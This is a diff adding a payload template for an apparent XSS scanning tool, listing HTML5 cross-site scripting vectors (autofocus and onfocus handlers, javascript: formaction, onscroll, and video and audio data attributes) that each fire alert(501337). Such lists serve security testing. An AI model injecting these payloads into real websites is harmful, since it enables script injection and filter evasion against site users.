@@ -1,0 +1,11 @@
+;template file for XssTestHtml5 payload
+;comments start with semicolon
+;payloads should be added line by line
+<form id=test /><button form=test formaction=javascript:alert(501337)>
+<event-source src=javascript:alert(501337)>
+<input autofocus onfocus=alert(501337)>
+<input onblur=alert(501337) autofocus><input autofocus>
+<body onscroll=alert(501337)><br><br><br><br><input autofocus>
+</a onmousemove=alert(501337)> (closing tag event handlers)
+<video src=1 data=javascript:alert(501337)>
+<audio src=1 data=javascript:alert(501337)>
